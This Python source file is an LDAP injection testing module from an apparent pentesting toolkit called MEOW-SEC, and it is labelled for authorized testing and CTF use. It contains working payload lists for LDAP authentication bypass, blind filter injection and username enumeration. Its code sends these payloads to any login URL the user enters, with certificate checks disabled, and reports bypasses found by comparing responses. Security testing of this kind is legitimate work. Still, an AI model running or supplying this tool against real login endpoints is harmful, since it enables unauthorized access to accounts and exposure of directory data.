# -*- coding: utf-8 -*-
"""
MEOW-SEC :: LDAPI — LDAP Injection Tester
For authorized security testing and CTF challenges only.
"""
import os, json, time
from datetime import datetime

from core.ui import (console, ok, err, info, warn, find, show_module_banner,
                     ask_target, ask_choice, print_result_table, G1, G2, CY, OR, RD, DM)
from core.cats import CAT_FOUND, CAT_SCAN, cat_talk

try:
    import requests
    HAS_REQUESTS = True
except ImportError:
    HAS_REQUESTS = False

from core.proxy_manager import px as _px

_UA = "Mozilla/5.0 (authorized-pentest-ldap)"

# ─── PAYLOADS ─────────────────────────────────────────────────

# Auth bypass payloads (username / password field)
_AUTH_BYPASS = [
    ("*",                           "Wildcard match all"),
    ("*)(uid=*",                    "Filter escape wildcard"),
    ("*)(|(uid=*",                  "OR injection wildcard"),
    ("admin)(&",                    "AND short-circuit"),
    ("admin)(|(password=*",         "OR password bypass"),
    ("*))%00",                      "Null byte truncation"),
    ("admin)(!(&(1=0",              "NOT AND bypass"),
    ("*)(objectClass=*",            "objectClass wildcard"),
    (")(|(cn=*",                    "CN wildcard"),
    ("admin))(|(uid=admin",         "Double paren bypass"),
    ("*)(mail=*",                   "Mail attr wildcard"),
    ("*|*",                         "Pipe bypass attempt"),
    ("admin/*",                     "Slash wildcard"),
    ("\x00",                        "Null byte"),
    ("\\2a)(uid=\\2a)(uid=\\2a",    "Hex-encoded wildcard"),
]

# Blind time-based (sleep via waits — LDAP doesn't have sleep() but we measure response delta)
_BLIND_DETECT = [
    ("*)(uid=*)(|(uid=*",   "Nested OR — expanded filter"),
    ("*)(cn=*)(|(cn=*",     "CN nested OR"),
    ("*)(mail=*",           "Mail attr existence check"),
    ("*)(description=*",    "Description attr exists"),
    ("*)(telephoneNumber=*","TelephoneNumber attr exists"),
]

# User enumeration payloads
_ENUM_USERS = [
    "admin", "administrator", "root", "user", "test", "guest",
    "ldap", "service", "svc", "manager", "operator", "support",
]

# Attribute extraction (blind char-by-char prefix)
_EXTRACT_ATTRS = ["uid", "cn", "mail", "sn", "givenName", "userPassword",
                  "telephoneNumber", "description", "memberOf"]

# ─── HELPERS ──────────────────────────────────────────────────

def _req(method, url, **kwargs):
    kwargs.setdefault("timeout", 10)
    kwargs.setdefault("verify", False)
    kwargs.setdefault("proxies", _px())
    kwargs.setdefault("headers", {"User-Agent": _UA})
    try:
        return requests.request(method, url, **kwargs)
    except Exception:
        return None

def _detect_success(r, baseline_size: int) -> bool:
    """Heuristic: login succeeded if response differs significantly from baseline."""
    if r is None:
        return False
    if r.status_code in (302, 303):
        loc = r.headers.get("Location", "")
        if any(k in loc for k in ("dashboard", "home", "profile", "welcome", "account")):
            return True
    if r.status_code == 200:
        text = r.text.lower()
        if any(k in text for k in ("welcome", "logout", "dashboard", "profile", "signed in")):
            return True
        if abs(len(r.content) - baseline_size) > 100:
            return True
    return False

# ─── TEST 1 — Auth bypass ─────────────────────────────────────

def _test_auth_bypass(url: str, user_field: str, pass_field: str,
                      method: str, extra: dict, cookies: dict) -> list:
    console.print(f"\n  [{CY}]→ LDAP auth bypass[/]")

    # Baseline with invalid credentials
    baseline_data = {user_field: "invalid_xyz_baseline", pass_field: "invalid_xyz_baseline"}
    baseline_data.update(extra)
    bl = _req(method, url, data=baseline_data if method == "POST" else None,
              params=baseline_data if method == "GET" else None, cookies=cookies)
    baseline_size = len(bl.content) if bl else 0
    info(f"Baseline: HTTP {bl.status_code if bl else 'ERR'}  {baseline_size} bytes")

    findings = []
    for payload, desc in _AUTH_BYPASS:
        test_data = {user_field: payload, pass_field: payload}
        test_data.update(extra)
        r = _req(method, url, data=test_data if method == "POST" else None,
                 params=test_data if method == "GET" else None, cookies=cookies)
        if r and _detect_success(r, baseline_size):
            find(f"AUTH BYPASS  [{desc}]  →  HTTP {r.status_code}  ({len(r.content)} bytes)")
            findings.append({
                "type": "ldap_auth_bypass",
                "payload": payload,
                "desc": desc,
                "status": r.status_code,
                "size": len(r.content),
            })
        else:
            status = r.status_code if r else "ERR"
            console.print(f"  [{DM}]  {desc:<45}  →  {status}[/]")
    return findings

# ─── TEST 2 — Blind attribute detection ──────────────────────

def _test_blind(url: str, user_field: str, pass_field: str,
                method: str, extra: dict, cookies: dict) -> list:
    console.print(f"\n  [{CY}]→ Blind LDAP filter injection[/]")
    baseline_data = {user_field: "admin", pass_field: "*"}
    baseline_data.update(extra)
    bl = _req(method, url, data=baseline_data if method == "POST" else None,
              params=baseline_data if method == "GET" else None, cookies=cookies)
    baseline_size = len(bl.content) if bl else 0

    findings = []
    for payload, desc in _BLIND_DETECT:
        test_data = {user_field: payload, pass_field: "*"}
        test_data.update(extra)
        r = _req(method, url, data=test_data if method == "POST" else None,
                 params=test_data if method == "GET" else None, cookies=cookies)
        if r and r.status_code != (bl.status_code if bl else 200):
            find(f"Blind response diff  [{desc}]  →  HTTP {r.status_code} vs baseline {bl.status_code if bl else '?'}")
            findings.append({
                "type": "ldap_blind",
                "payload": payload,
                "desc": desc,
                "status": r.status_code,
                "baseline_status": bl.status_code if bl else 0,
            })
        else:
            status = r.status_code if r else "ERR"
            console.print(f"  [{DM}]  {desc:<45}  →  {status}[/]")
    return findings

# ─── TEST 3 — User enumeration ────────────────────────────────

def _test_user_enum(url: str, user_field: str, pass_field: str,
                    method: str, extra: dict, cookies: dict) -> list:
    console.print(f"\n  [{CY}]→ User enumeration via LDAP wildcard[/]")
    baseline_data = {user_field: "nonexistent_xyz_99", pass_field: "*"}
    baseline_data.update(extra)
    bl = _req(method, url, data=baseline_data if method == "POST" else None,
              params=baseline_data if method == "GET" else None, cookies=cookies)
    baseline_size = len(bl.content) if bl else 0
    baseline_status = bl.status_code if bl else 200

    findings = []
    for username in _ENUM_USERS:
        test_data = {user_field: username, pass_field: "*"}
        test_data.update(extra)
        r = _req(method, url, data=test_data if method == "POST" else None,
                 params=test_data if method == "GET" else None, cookies=cookies)
        if r and (r.status_code != baseline_status or abs(len(r.content) - baseline_size) > 50):
            find(f"User EXISTS: [{username}]  →  HTTP {r.status_code}  ({len(r.content)} bytes vs {baseline_size})")
            findings.append({
                "type": "ldap_user_enum",
                "username": username,
                "status": r.status_code,
                "size": len(r.content),
            })
        else:
            status = r.status_code if r else "ERR"
            console.print(f"  [{DM}]  {username:<20}  →  {status} (not found or same response)[/]")
    return findings

# ─── SAVE ─────────────────────────────────────────────────────

def _save(target: str, findings: list):
    if not findings:
        return
    os.makedirs("data", exist_ok=True)
    fname = f"data/ldapi_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
    with open(fname, "w", encoding="utf-8") as f:
        json.dump({"target": target, "findings": findings, "ts": datetime.now().isoformat()}, f, indent=2)
    ok(f"Saved → {fname}")

# ─── MAIN ─────────────────────────────────────────────────────

def run():
    show_module_banner("ldapi")
    if not HAS_REQUESTS:
        err("requests not installed"); return

    console.print(f"\n  [{CY}]LDAP Injection Tester[/]  [{DM}]— auth bypass, blind, user enum[/]\n")

    url = ask_target("Target URL (login endpoint)")
    if not url:
        return
    if not url.startswith("http"):
        url = "http://" + url

    method = (ask_choice("HTTP method [POST/GET]") or "POST").upper()
    user_field = ask_choice("Username field name [default: username]") or "username"
    pass_field = ask_choice("Password field name [default: password]") or "password"

    extra_raw = ask_choice("Extra POST fields (key=value&key2=val2) [Enter to skip]")
    extra = {}
    if extra_raw:
        for part in extra_raw.split("&"):
            if "=" in part:
                k, v = part.split("=", 1)
                extra[k.strip()] = v.strip()

    cookie_str = ask_choice("Session cookie (name=value; ...) [Enter to skip]")
    cookies = {}
    if cookie_str and "=" in cookie_str:
        for part in cookie_str.split(";"):
            if "=" in part:
                k, v = part.strip().split("=", 1)
                cookies[k.strip()] = v.strip()

    console.print(f"\n  [{CY}]Tests:[/]")
    console.print(f"  [{G2}][1][/] Auth bypass")
    console.print(f"  [{G2}][2][/] Blind attribute injection")
    console.print(f"  [{G2}][3][/] User enumeration")
    console.print(f"  [{G2}][4][/] All tests")
    mode = ask_choice("Mode") or "4"

    all_findings = []
    if mode in ("1", "4"):
        all_findings += _test_auth_bypass(url, user_field, pass_field, method, extra, cookies)
    if mode in ("2", "4"):
        all_findings += _test_blind(url, user_field, pass_field, method, extra, cookies)
    if mode in ("3", "4"):
        all_findings += _test_user_enum(url, user_field, pass_field, method, extra, cookies)

    console.print()
    if all_findings:
        cat_talk(CAT_FOUND, f"{len(all_findings)} LDAP injection finding(s)!", G1)
        rows = [[f["type"], f.get("payload", f.get("username", "?")), str(f.get("status", "?")),
                 f.get("desc", f.get("type", "?"))]
                for f in all_findings]
        print_result_table(["Type", "Payload / User", "Status", "Detail"], rows)
        _save(url, all_findings)
    else:
        cat_talk(CAT_SCAN, "No LDAP injection detected (may not be LDAP-backed, or correctly sanitised, DM).", DM)
